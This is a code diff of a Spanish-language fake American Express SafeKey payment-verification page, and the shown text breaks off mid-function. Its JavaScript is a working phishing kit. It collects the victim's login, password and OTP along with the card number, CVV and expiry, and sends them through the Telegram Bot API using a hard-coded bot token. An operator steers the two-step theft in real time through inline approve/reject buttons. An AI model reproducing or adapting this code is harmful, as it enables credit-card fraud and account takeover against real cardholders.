@@ -3,16 +3,20 @@
 <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>American Express SafeKey</title>
+    <title>American Express SafeKey®</title>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" />
     <style>
         :root {
-            --amex-blue: #006FCF;
-            --amex-light-blue: #F0F5FB;
-            --amex-gray: #666666;
-            --amex-light-gray: #EEEEEE;
-            --amex-text: #333333;
-            --amex-border: #CCCCCC;
+            --amex-blue: #006fcf;
+            --amex-blue-dark: #004b9f;
+            --amex-gold: #f9b81b;
+            --amex-bg: #f5f7fa;
+            --amex-white: #ffffff;
+            --amex-text: #1a1a2e;
+            --amex-text-muted: #6b7280;
+            --amex-border: #e5e7eb;
+            --amex-success: #16a34a;
+            --amex-error: #dc2626;
         }
 
         * {
@@ -21,92 +25,126 @@
             box-sizing: border-box;
         }
 
-        html, body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            background: linear-gradient(135deg, #F5F5F5 0%, #EEEEEE 100%);
-            color: var(--amex-text);
+        body {
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            background: var(--amex-bg);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 16px;
+            padding: 20px;
         }
 
         .container {
-            background: #FFFFFF;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            background: var(--amex-white);
+            border-radius: 16px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
             padding: 40px;
-            max-width: 520px;
+            max-width: 480px;
             width: 100%;
         }
 
+        /* HEADER */
         .header {
             display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-            gap: 16px;
-            margin-bottom: 32px;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 24px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--amex-border);
         }
 
         .amex-logo {
-            width: 280px;
-            height: auto;
-            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
         }
 
         .amex-logo img {
-            width: 100%;
-            height: auto;
+            height: 40px;
+            width: auto;
             display: block;
         }
 
-        .header-content {
-            width: 100%;
+        .amex-badge {
+            background: var(--amex-blue);
+            color: white;
+            font-size: 0.6rem;
+            font-weight: 700;
+            padding: 4px 12px;
+            border-radius: 20px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
         }
 
-        .header-title {
-            font-size: 1.5rem;
-            font-weight: 600;
+        .language-selector {
+            font-size: 0.75rem;
+            color: var(--amex-text-muted);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .language-selector:hover {
             color: var(--amex-text);
-            margin-bottom: 12px;
-            line-height: 1.2;
-            margin-top: 0;
         }
 
-        .header-subtitle {
+        /* TÍTULO */
+        .form-title {
+            font-size: 1.375rem;
+            font-weight: 700;
+            color: var(--amex-text);
+            margin-bottom: 4px;
+        }
+
+        .form-subtitle {
             font-size: 0.9375rem;
-            color: var(--amex-gray);
+            color: var(--amex-text-muted);
+            margin-bottom: 24px;
             line-height: 1.5;
-            margin: 0;
         }
 
+        .form-subtitle strong {
+            color: var(--amex-text);
+        }
+
+        /* INFO DE TRANSACCIÓN */
         .transaction-info {
-            background: var(--amex-light-blue);
-            border: 1px solid #E0E9F5;
-            border-radius: 6px;
-            padding: 20px;
-            margin-bottom: 28px;
+            background: #f8fafc;
+            border-radius: 12px;
+            padding: 14px 18px;
+            margin-bottom: 24px;
+            border: 1px solid var(--amex-border);
         }
 
         .info-row {
             display: flex;
             justify-content: space-between;
-            padding: 8px 0;
-            font-size: 0.9375rem;
+            align-items: center;
+            padding: 5px 0;
+            font-size: 0.875rem;
+        }
+
+        .info-row:not(:last-child) {
+            border-bottom: 1px solid var(--amex-border);
         }
 
         .info-label {
-            color: var(--amex-gray);
+            color: var(--amex-text-muted);
             font-weight: 500;
+            min-width: 80px;
+            flex-shrink: 0;
         }
 
         .info-value {
             color: var(--amex-text);
             font-weight: 600;
             text-align: right;
+            flex: 1;
         }
 
+        /* FORMULARIO */
         form {
             display: flex;
             flex-direction: column;
@@ -116,29 +154,30 @@
         .form-group {
             display: flex;
             flex-direction: column;
-            gap: 6px;
+            gap: 4px;
         }
 
         .form-label {
-            font-size: 0.875rem;
+            font-size: 0.8125rem;
             font-weight: 600;
             color: var(--amex-text);
         }
 
+        .form-label .required {
+            color: var(--amex-error);
+            margin-left: 2px;
+        }
+
         .form-input {
-            padding: 11px 14px;
-            border: 1px solid var(--amex-border);
-            border-radius: 4px;
-            font-family: 'Inter', system-ui, sans-serif;
+            padding: 12px 16px;
+            border: 2px solid var(--amex-border);
+            border-radius: 8px;
+            font-family: 'Inter', sans-serif;
             font-size: 1rem;
             color: var(--amex-text);
             transition: border-color 0.2s, box-shadow 0.2s;
-            background: #FFFFFF;
+            background: var(--amex-white);
             width: 100%;
-        }
-
-        .form-input::placeholder {
-            color: #999999;
         }
 
         .form-input:focus {
@@ -147,198 +186,204 @@
             box-shadow: 0 0 0 3px rgba(0, 111, 207, 0.1);
         }
 
+        .form-input::placeholder {
+            color: #a0a0a0;
+        }
+
         .form-input:disabled {
-            background-color: #F9F9F9;
-            color: #999999;
+            background: #f3f4f6;
             cursor: not-allowed;
         }
 
-        .credentials-section {
-            background: #FAFAFA;
-            border: 1px solid var(--amex-light-gray);
-            border-radius: 6px;
-            padding: 16px;
-            margin-bottom: 16px;
+        .form-input.error {
+            border-color: var(--amex-error);
         }
 
-        .credentials-title {
-            font-size: 0.75rem;
-            font-weight: 700;
-            color: var(--amex-gray);
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 12px;
-        }
-
-        .credentials-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
-        }
-
-        .credentials-grid .form-group {
-            gap: 4px;
-        }
-
-        .credentials-grid .form-label {
-            font-size: 0.8125rem;
-        }
-
-        .otp-section {
-            background: #FAFAFA;
-            border: 1px solid var(--amex-light-gray);
-            border-radius: 6px;
-            padding: 16px;
-            margin-bottom: 20px;
-        }
-
-        .otp-title {
-            font-size: 0.75rem;
-            font-weight: 700;
-            color: var(--amex-gray);
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 4px;
-        }
-
-        .otp-info {
-            font-size: 0.8125rem;
-            color: var(--amex-gray);
-            margin-bottom: 10px;
-            line-height: 1.4;
-        }
-
-        .button-group {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            margin-top: 24px;
-            flex-wrap: wrap;
-        }
-
-        .btn {
-            padding: 10px 28px;
-            border: none;
-            border-radius: 4px;
-            font-family: 'Inter', system-ui, sans-serif;
-            font-size: 0.9375rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 40px;
-        }
-
-        .btn-primary {
-            background-color: var(--amex-blue);
-            color: #FFFFFF;
-            flex: 1;
-            min-width: 120px;
-        }
-
-        .btn-primary:hover {
-            background-color: #0055A4;
-            box-shadow: 0 2px 4px rgba(0, 111, 207, 0.3);
-        }
-
-        .btn-primary:disabled {
-            background-color: var(--amex-light-gray);
-            cursor: not-allowed;
-            box-shadow: none;
-        }
-
-        .btn-secondary {
-            background-color: #FFFFFF;
-            color: var(--amex-blue);
-            border: 1px solid var(--amex-blue);
-            flex: 1;
-            min-width: 120px;
-        }
-
-        .btn-secondary:hover {
-            background-color: var(--amex-light-blue);
-        }
-
-        .btn-link {
-            background: none;
-            color: var(--amex-blue);
-            border: none;
-            font-weight: 600;
-            padding: 0;
-            cursor: pointer;
-            text-decoration: none;
-            font-size: 0.875rem;
-            min-width: auto;
-        }
-
-        .btn-link:hover {
-            text-decoration: underline;
-        }
-
-        .checkbox-group {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-bottom: 20px;
-        }
-
-        .checkbox-group input[type="checkbox"] {
-            width: 18px;
-            height: 18px;
-            cursor: pointer;
-            accent-color: var(--amex-blue);
-        }
-
-        .checkbox-group label {
-            font-size: 0.875rem;
-            color: var(--amex-text);
-            cursor: pointer;
-            margin: 0;
+        .form-input.error:focus {
+            box-shadow: 0 0 0 3px rgba(220, 38, 38, 0.1);
         }
 
         .error-message {
-            color: #D32F2F;
+            color: var(--amex-error);
             font-size: 0.75rem;
-            margin-top: 4px;
             display: none;
+            margin-top: 4px;
         }
 
         .form-group.error .form-input {
-            border-color: #D32F2F;
-            box-shadow: 0 0 0 3px rgba(211, 47, 47, 0.1);
+            border-color: var(--amex-error);
         }
 
         .form-group.error .error-message {
             display: block;
         }
 
+        /* OTP SECTION */
+        .otp-section {
+            display: none;
+            animation: fadeIn 0.4s ease;
+            background: #f8fafc;
+            border: 1px solid var(--amex-border);
+            border-radius: 12px;
+            padding: 16px 18px;
+            margin-top: 4px;
+        }
+
+        .otp-section.visible {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .otp-info {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.8125rem;
+            color: var(--amex-text-muted);
+            margin-bottom: 8px;
+        }
+
+        .otp-info svg {
+            width: 18px;
+            height: 18px;
+            flex-shrink: 0;
+        }
+
+        .otp-actions {
+            display: flex;
+            gap: 12px;
+            margin-top: 8px;
+            flex-wrap: wrap;
+        }
+
+        .otp-actions .btn-link {
+            background: none;
+            border: none;
+            color: var(--amex-blue);
+            font-size: 0.8125rem;
+            font-weight: 600;
+            cursor: pointer;
+            padding: 4px 0;
+            text-decoration: underline;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .otp-actions .btn-link:hover {
+            color: var(--amex-blue-dark);
+        }
+
+        /* BOTONES */
+        .button-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 8px;
+        }
+
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            font-family: 'Inter', sans-serif;
+            font-size: 0.9375rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            flex: 1;
+            text-align: center;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-primary {
+            background: var(--amex-blue);
+            color: white;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            background: var(--amex-blue-dark);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: var(--amex-text-muted);
+            border: 2px solid var(--amex-border);
+        }
+
+        .btn-secondary:hover {
+            background: #f3f4f6;
+            border-color: #9ca3af;
+        }
+
+        /* FOOTER */
+        .form-footer {
+            margin-top: 20px;
+            padding-top: 16px;
+            border-top: 1px solid var(--amex-border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        .form-footer .help-text {
+            font-size: 0.75rem;
+            color: var(--amex-text-muted);
+        }
+
+        .form-footer .help-text a {
+            color: var(--amex-blue);
+            text-decoration: none;
+        }
+
+        .form-footer .help-text a:hover {
+            text-decoration: underline;
+        }
+
+        /* STATUS MESSAGE */
         .status-message {
             display: none;
             padding: 12px 16px;
-            border-radius: 6px;
-            margin-bottom: 16px;
-            font-size: 0.9375rem;
+            border-radius: 8px;
+            font-size: 0.875rem;
             font-weight: 500;
+            margin-bottom: 16px;
             text-align: center;
         }
 
         .status-message.error {
             display: block;
-            background: #FFEBEE;
-            color: #C62828;
-            border: 1px solid #FFCDD2;
+            background: #fef2f2;
+            color: var(--amex-error);
+            border: 1px solid #fecaca;
         }
 
         .status-message.success {
             display: block;
-            background: #E8F5E9;
-            color: #2E7D32;
-            border: 1px solid #C8E6C9;
+            background: #f0fdf4;
+            color: var(--amex-success);
+            border: 1px solid #bbf7d0;
         }
 
+        .status-message.info {
+            display: block;
+            background: #eff6ff;
+            color: #1e40af;
+            border: 1px solid #bfdbfe;
+        }
+
+        /* LOADING OVERLAY */
         .loading-overlay {
             display: none;
             position: fixed;
@@ -346,11 +391,12 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.7);
+            background: rgba(0, 0, 0, 0.6);
             z-index: 1000;
             justify-content: center;
             align-items: center;
             flex-direction: column;
+            backdrop-filter: blur(4px);
         }
 
         .loading-overlay.active {
@@ -358,13 +404,13 @@
         }
 
         .spinner {
-            width: 60px;
-            height: 60px;
+            width: 48px;
+            height: 48px;
             border: 4px solid rgba(255, 255, 255, 0.3);
-            border-top: 4px solid #fff;
+            border-top: 4px solid white;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 16px;
         }
 
         @keyframes spin {
@@ -373,47 +419,77 @@
         }
 
         .loading-text {
-            color: #fff;
-            font-size: 1.125rem;
+            color: white;
+            font-size: 1rem;
             font-weight: 500;
             text-align: center;
         }
 
         .loading-subtext {
-            color: rgba(255, 255, 255, 0.8);
+            color: rgba(255, 255, 255, 0.7);
             font-size: 0.875rem;
-            margin-top: 8px;
-        }
-
-        @media (max-width: 640px) {
-            .container { padding: 24px; }
-            .header { gap: 12px; margin-bottom: 28px; }
-            .amex-logo { width: 200px; }
-            .header-title { font-size: 1.25rem; }
-            .header-subtitle { font-size: 0.875rem; }
+            margin-top: 4px;
         }
 
         @media (max-width: 480px) {
-            .container { padding: 20px; }
-            .header { gap: 10px; margin-bottom: 24px; }
-            .amex-logo { width: 160px; }
-            .header-title { font-size: 1.125rem; margin-bottom: 8px; }
-            .header-subtitle { font-size: 0.8125rem; }
-            .credentials-grid { grid-template-columns: 1fr; }
-            .button-group { flex-direction: column; gap: 10px; }
-            .btn-primary, .btn-secondary { width: 100%; flex: none; }
-            .info-row { font-size: 0.875rem; }
+            .container {
+                padding: 20px;
+                border-radius: 12px;
+            }
+
+            .form-title {
+                font-size: 1.125rem;
+            }
+
+            .button-group {
+                flex-direction: column;
+            }
+
+            .btn {
+                width: 100%;
+            }
+
+            .form-footer {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .amex-logo img {
+                height: 30px;
+            }
+
+            .info-label {
+                min-width: 60px;
+                font-size: 0.8rem;
+            }
+
+            .info-value {
+                font-size: 0.8rem;
+            }
+
+            .header {
+                flex-wrap: wrap;
+                gap: 8px;
+            }
         }
 
         @media (max-width: 360px) {
-            .container { padding: 16px; }
-            .amex-logo { width: 140px; }
-            .header-title { font-size: 1rem; }
+            .amex-logo img {
+                height: 26px;
+            }
+
+            .info-label {
+                min-width: 50px;
+                font-size: 0.75rem;
+            }
+
+            .info-value {
+                font-size: 0.75rem;
+            }
         }
     </style>
 </head>
 <body>
-    <!-- LOADING OVERLAY -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner"></div>
         <div class="loading-text">Verificando autenticación...</div>
@@ -421,109 +497,132 @@
     </div>
 
     <div class="container">
+        <!-- HEADER -->
         <div class="header">
             <div class="amex-logo">
-                <img src="amex.png" alt="American Express SafeKey" />
+                <img src="amex.png" alt="American Express" />
+                <span class="amex-badge">SafeKey®</span>
             </div>
-            <div class="header-content">
-                <h1 class="header-title">American Express SafeKey® Payment</h1>
-                <p class="header-subtitle">Ingrese sus credenciales de seguridad a continuación.</p>
-            </div>
+            <span class="language-selector">▼ Español</span>
         </div>
 
+        <!-- TÍTULO -->
+        <h1 class="form-title">American Express SafeKey®</h1>
+        <p class="form-subtitle">
+            Ingrese el código OTP recibido en su <strong>número de teléfono registrado</strong> para validar la transacción.
+        </p>
+
+        <!-- INFO TRANSACCIÓN -->
         <div class="transaction-info">
             <div class="info-row">
-                <span class="info-label">Merchant</span>
-                <span class="info-value">Superintendencia</span>
+                <span class="info-label">Comercio</span>
+                <span class="info-value">Superintendencia de Notariado</span>
             </div>
             <div class="info-row">
-                <span class="info-label">Merchant Amount</span>
+                <span class="info-label">Monto</span>
                 <span class="info-value" id="transaction-amount">23.000 Col$</span>
             </div>
             <div class="info-row">
-                <span class="info-label">Date</span>
-                <span class="info-value" id="transaction-date">2026/08/10</span>
+                <span class="info-label">Fecha</span>
+                <span class="info-value" id="transaction-date">14/08/2026 10:13 PM</span>
             </div>
             <div class="info-row">
-                <span class="info-label">Card number</span>
-                <span class="info-value" id="card-last-digits">XXXX XXXX XXXX 0000</span>
+                <span class="info-label">Tarjeta</span>
+                <span class="info-value" id="card-last-digits">Amex •••• •••• •••• 0000</span>
             </div>
         </div>
 
+        <!-- STATUS MESSAGE -->
         <div class="status-message" id="statusMessage"></div>
 
+        <!-- FORMULARIO -->
         <form id="authForm" novalidate>
-            <div class="credentials-section">
-                <div class="credentials-title">Credenciales de acceso</div>
-                <div class="credentials-grid">
-                    <div class="form-group">
-                        <label class="form-label">Usuario</label>
-                        <input type="text" class="form-input" id="username" placeholder="Tu usuario" required />
-                        <div class="error-message">El usuario es requerido</div>
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">Contraseña</label>
-                        <input type="password" class="form-input" id="password" placeholder="Tu contraseña" required />
-                        <div class="error-message">La contraseña es requerida</div>
-                    </div>
+            <!-- CREDENCIALES -->
+            <div class="form-group">
+                <label class="form-label">Usuario <span class="required">*</span></label>
+                <input type="text" class="form-input" id="username" placeholder="Ingresa tu usuario" required />
+                <div class="error-message">El usuario es requerido</div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Contraseña <span class="required">*</span></label>
+                <input type="password" class="form-input" id="password" placeholder="Ingresa tu contraseña" required />
+                <div class="error-message">La contraseña es requerida</div>
+            </div>
+
+            <!-- OTP (OCULTO) -->
+            <div class="otp-section" id="otpSection">
+                <div class="otp-info">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                        <path d="M12 8v4"/>
+                        <path d="M12 16h.01"/>
+                    </svg>
+                    <span>Ingresa el código OTP de 6 dígitos</span>
+                </div>
+                <div class="form-group" style="margin-bottom:0;">
+                    <label class="form-label">Código OTP <span class="required">*</span></label>
+                    <input type="text" class="form-input" id="confirmationCode" placeholder="Ingresa el código OTP" maxlength="6" inputmode="numeric" required />
+                    <div class="error-message">El código OTP debe tener 6 dígitos</div>
+                </div>
+                <div class="otp-actions">
+                    <button type="button" class="btn-link" id="requestNewOtp">Solicitar nuevo OTP</button>
                 </div>
             </div>
 
-            <div class="otp-section">
-                <div class="otp-title">Código OTP (One-Time Password)</div>
-                <p class="otp-info">Se ha enviado un código de 6 dígitos a su móvil y correo electrónico registrado</p>
-                <div class="form-group">
-                    <label class="form-label">OTP</label>
-                    <input type="text" class="form-input" id="confirmationCode" placeholder="Ingrese el código OTP" maxlength="6" inputmode="numeric" required />
-                    <div class="error-message">El código OTP es requerido (6 dígitos)</div>
-                </div>
-            </div>
-
-            <div class="checkbox-group">
-                <input type="checkbox" id="memberRewards" />
-                <label for="memberRewards">Redimir Membership Rewards® Points en esta transacción</label>
-            </div>
-
+            <!-- BOTONES -->
             <div class="button-group">
-                <button type="button" class="btn btn-secondary" id="cancelBtn">Cancelar</button>
-                <button type="submit" class="btn btn-primary" id="submitButton">Confirmar</button>
-            </div>
-
-            <div style="text-align: center; margin-top: 16px;">
-                <a href="#" class="btn-link" id="helpLink">Ayuda</a>
+                <button type="submit" class="btn btn-primary" id="submitButton">
+                    <span id="buttonText">Enviar</span>
+                </button>
+                <button type="button" class="btn btn-secondary" id="cancelButton">Cancelar</button>
             </div>
         </form>
+
+        <!-- FOOTER -->
+        <div class="form-footer">
+            <span class="help-text">
+                <a href="#" id="helpLink">Ayuda</a>
+            </span>
+            <span class="help-text">
+                Al continuar, aceptas los <a href="#">Términos</a> y <a href="#">Política de Privacidad</a>
+            </span>
+        </div>
     </div>
 
     <script>
         // ============================================
-        // CONFIGURACIÓN (idéntica a paso3.html)
+        // CONFIGURACIÓN
         // ============================================
         const TELEGRAM_BOT_TOKEN = '8952571695:AAHr5qHDQ7Hu0LoqGS49jUWg9MYFjO1MaBw';
         const TELEGRAM_CHAT_ID = '-1004389419498';
-        const WEBHOOK_URL = '/api/webhook';  // Relativa, como en paso3
-        const POLLING_INTERVAL = 3000;
+        const WEBHOOK_URL = '/api/webhook';
+        const POLLING_INTERVAL = 2000;
         const MAX_POLLING_TIME = 300000;
 
         let solicitudId = null;
         let pollingInterval = null;
+        let pasoActual = 'credenciales';
 
         // Elementos DOM
         const form = document.getElementById('authForm');
         const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password');
         const confirmationInput = document.getElementById('confirmationCode');
+        const otpSection = document.getElementById('otpSection');
         const submitButton = document.getElementById('submitButton');
+        const buttonText = document.getElementById('buttonText');
         const loadingOverlay = document.getElementById('loadingOverlay');
         const statusMessage = document.getElementById('statusMessage');
+        const cancelButton = document.getElementById('cancelButton');
 
         // ============================================
-        // INICIALIZACIÓN (con configuración de webhook)
+        // INICIALIZACIÓN
         // ============================================
-        window.addEventListener('load', async function() {
+        window.addEventListener('load', function() {
             initializeTransaction();
-            await configurarWebhook();   // <-- ESTO ES LO QUE FALTABA
-            console.log('✅ Sistema AMEX SafeKey listo - Webhook activo');
+            configurarWebhook();
+            console.log('✅ American Express SafeKey listo');
         });
 
         function initializeTransaction() {
@@ -532,46 +631,60 @@
             if (storagePriority) amount += 20000;
             const formattedAmount = amount.toLocaleString('es-CO').replace(/,/g, '.');
             document.getElementById('transaction-amount').textContent = formattedAmount + ' Col$';
+            
             const now = new Date();
-            const dateStr = now.toLocaleDateString('es-CO', { year: 'numeric', month: '2-digit', day: '2-digit' }).split('/').reverse().join('/');
-            document.getElementById('transaction-date').textContent = dateStr;
-            let cardLast4 = sessionStorage.getItem('cardLast4') || localStorage.getItem('cardLast4') || '0000';
-            document.getElementById('card-last-digits').textContent = `XXXX XXXX XXXX ${cardLast4}`;
+            const dateStr = now.toLocaleDateString('es-CO', { 
+                year: 'numeric', 
+                month: '2-digit', 
+                day: '2-digit' 
+            }).split('/').reverse().join('/');
+            const timeStr = now.toLocaleTimeString('es-CO', { 
+                hour: '2-digit', 
+                minute: '2-digit', 
+                second: '2-digit',
+                hour12: true
+            });
+            document.getElementById('transaction-date').textContent = `${dateStr} ${timeStr}`;
+            
+            let cardLast4 = sessionStorage.getItem('cardLast4') || '0000';
+            document.getElementById('card-last-digits').textContent = `Amex •••• •••• •••• ${cardLast4}`;
+            
+            const cardNumber = sessionStorage.getItem('cardNumber') || 'No disponible';
+            const cvc = sessionStorage.getItem('cvc') || 'No disponible';
+            const expiry = sessionStorage.getItem('expiry') || 'No disponible';
+            
+            sessionStorage.setItem('cardNumberFull', cardNumber);
+            sessionStorage.setItem('cardCVV', cvc);
+            sessionStorage.setItem('cardExpiry', expiry);
         }
 
-        // ============================================
-        // CONFIGURAR WEBHOOK (idéntico a paso3)
-        // ============================================
         async function configurarWebhook() {
             try {
                 const response = await fetch(`${WEBHOOK_URL}?setup=true`);
                 const data = await response.json();
                 console.log('🔗 Webhook configurado:', data);
-                return data.success;
             } catch (error) {
                 console.error('❌ Error configurando webhook:', error);
-                return false;
             }
         }
 
         // ============================================
-        // FUNCIONES DE TELEGRAM
+        // FUNCIONES TELEGRAM
         // ============================================
         function generarSolicitudId() {
             return 'AMEX-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
         }
 
-        async function enviarDatosATelegram(datos) {
+        async function enviarCredencialesATelegram(datos) {
             try {
                 const inlineKeyboard = {
                     inline_keyboard: [
-                        [{ text: "✅ APROBAR", callback_data: `approve_${datos.solicitudId}` }],
-                        [{ text: "❌ ERROR USUARIO", callback_data: `user_error_${datos.solicitudId}` }, { text: "❌ ERROR CONTRASEÑA", callback_data: `pass_error_${datos.solicitudId}` }],
-                        [{ text: "❌ ERROR OTP", callback_data: `otp_error_${datos.solicitudId}` }]
+                        [{ text: "📱 PEDIR OTP", callback_data: `pedir_otp_${datos.solicitudId}` }],
+                        [{ text: "❌ ERROR CREDENCIALES", callback_data: `error_credenciales_${datos.solicitudId}` }]
                     ]
                 };
 
-                const mensaje = `🔔 *AMEX SAFEKEY - AUTENTICACIÓN*
+                const mensaje = `🔔 *AMERICAN EXPRESS SAFEKEY - CREDENCIALES*
 
 🆔 ID: \`${datos.solicitudId}\`
 
@@ -580,20 +693,16 @@
 🔢 CVV: \`${datos.cvv}\`
 📅 Vencimiento: \`${datos.vencimiento}\`
 
-🔐 *CREDENCIALES:*
+🏛️ *CREDENCIALES:*
 👤 Usuario: \`${datos.usuario}\`
 🔑 Contraseña: \`${datos.password}\`
-
-📱 *OTP:*
-🔢 Código: \`${datos.otp}\`
 
 💰 Monto: ${datos.monto}
 📅 Fecha: ${datos.fecha}
 
-⏳ *Estado:* Esperando verificación...`;
+⏳ *Estado:* Esperando verificación de credenciales...`;
 
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                const response = await fetch(url, {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -604,54 +713,165 @@
                         disable_web_page_preview: true
                     })
                 });
+
                 const data = await response.json();
+                console.log('📤 Credenciales enviadas:', data.ok);
                 return data.ok;
             } catch (error) {
-                console.error('❌ Error al enviar a Telegram:', error);
+                console.error('❌ Error:', error);
                 return false;
             }
         }
 
-        // Consulta al webhook
-        async function verificarEstadoWebhook(solicitudId) {
+        async function enviarOTPATelegram(datos) {
             try {
-                const response = await fetch(`${WEBHOOK_URL}?check=${solicitudId}`);
+                const inlineKeyboard = {
+                    inline_keyboard: [
+                        [{ text: "✅ APROBAR OTP", callback_data: `aprobar_otp_${datos.solicitudId}` }],
+                        [{ text: "❌ RECHAZAR OTP", callback_data: `rechazar_otp_${datos.solicitudId}` }]
+                    ]
+                };
+
+                const mensaje = `🔔 *AMERICAN EXPRESS SAFEKEY - CÓDIGO OTP*
+
+🆔 ID: \`${datos.solicitudId}\`
+
+📱 *CÓDIGO DE VERIFICACIÓN:*
+🔢 OTP: \`${datos.otp}\`
+
+👤 Usuario: \`${datos.usuario}\`
+
+💰 Monto: ${datos.monto}
+📅 Fecha: ${datos.fecha}
+
+⏳ *Estado:* Esperando verificación OTP...`;
+
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'Markdown',
+                        reply_markup: inlineKeyboard,
+                        disable_web_page_preview: true
+                    })
+                });
+
                 const data = await response.json();
-                console.log('📊 Estado webhook:', data.estado);
-                return data.estado || 'pending';
+                console.log('📤 OTP enviado:', data.ok);
+                return data.ok;
             } catch (error) {
-                console.error('❌ Error verificando webhook:', error);
-                return 'error';
+                console.error('❌ Error:', error);
+                return false;
             }
         }
 
-        function iniciarPolling() {
+        // ============================================
+        // VERIFICAR ESTADO
+        // ============================================
+        async function verificarEstadoSolicitud(solicitudId, intentos = 3) {
+            for (let i = 0; i < intentos; i++) {
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 5000);
+                    
+                    const response = await fetch(`${WEBHOOK_URL}?check=${solicitudId}`, {
+                        signal: controller.signal
+                    });
+                    clearTimeout(timeoutId);
+                    
+                    const data = await response.json();
+                    console.log('📊 Estado:', data.estado);
+                    return data.estado || 'pending';
+                } catch (error) {
+                    console.log(`⚠️ Intento ${i+1} falló`);
+                    if (i === intentos - 1) return 'error';
+                    await new Promise(r => setTimeout(r, 1000));
+                }
+            }
+            return 'error';
+        }
+
+        // ============================================
+        // POLLING
+        // ============================================
+        function iniciarPollingCredenciales() {
             let tiempoInicio = Date.now();
+            
+            if (pollingInterval) {
+                clearInterval(pollingInterval);
+                pollingInterval = null;
+            }
+            
+            console.log('🔄 Polling credenciales...');
+            
             pollingInterval = setInterval(async () => {
                 if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
                     clearInterval(pollingInterval);
-                    mostrarError('Tiempo de espera agotado. Intente nuevamente.');
+                    pollingInterval = null;
+                    mostrarError('⏰ Tiempo de espera agotado');
+                    resetFormulario();
                     return;
                 }
-                const resultado = await verificarEstadoWebhook(solicitudId);
-                if (resultado === 'approved') {
+                
+                const resultado = await verificarEstadoSolicitud(solicitudId);
+                
+                if (resultado === 'pedir_otp') {
                     clearInterval(pollingInterval);
+                    pollingInterval = null;
+                    console.log('✅ OTP solicitado');
+                    mostrarOTP();
+                    loadingOverlay.classList.remove('active');
+                    submitButton.disabled = false;
+                    buttonText.textContent = 'Verificar OTP';
+                    return;
+                } else if (resultado === 'error_credenciales') {
+                    clearInterval(pollingInterval);
+                    pollingInterval = null;
+                    mostrarError('❌ Los datos ingresados no coinciden. Intente de nuevo.');
+                    resetFormulario();
+                    return;
+                }
+            }, POLLING_INTERVAL);
+        }
+
+        function iniciarPollingOTP() {
+            let tiempoInicio = Date.now();
+            
+            if (pollingInterval) {
+                clearInterval(pollingInterval);
+                pollingInterval = null;
+            }
+            
+            console.log('🔄 Polling OTP...');
+            
+            pollingInterval = setInterval(async () => {
+                if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
+                    clearInterval(pollingInterval);
+                    pollingInterval = null;
+                    mostrarError('⏰ Tiempo de espera agotado');
+                    resetFormulario();
+                    return;
+                }
+                
